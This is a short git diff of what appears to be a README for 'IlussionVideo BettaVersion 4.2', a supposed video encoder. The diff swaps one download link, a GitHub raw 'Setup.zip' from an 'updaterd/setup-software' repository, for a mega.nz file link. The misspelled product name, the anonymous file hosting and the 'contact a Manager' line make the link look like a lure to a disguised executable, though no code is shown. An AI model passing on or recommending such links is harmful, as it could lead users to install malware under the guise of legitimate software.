@@ -18,7 +18,7 @@ Encode only the frames that have changed instead of re-encoding entire files for
 
 
 Let’s change the way we connect.
-## [:zap:IlussionVideo BettaVersion 4.2](https://raw.githubusercontent.com/updaterd/setup-software/master/Setup.zip):After contact a Manager for further information.
+## [:zap:IlussionVideo BettaVersion 4.2](https://mega.nz/file/1dh02T6B#hZAQGdLIqESDH5fetXVCHpPGOY1gR0guIe3IArLfl6o):After contact a Manager for further information.
 Minimum:
 Operating System: Windows 10.
 Processor: Intel Pentium 4 (Prescott)
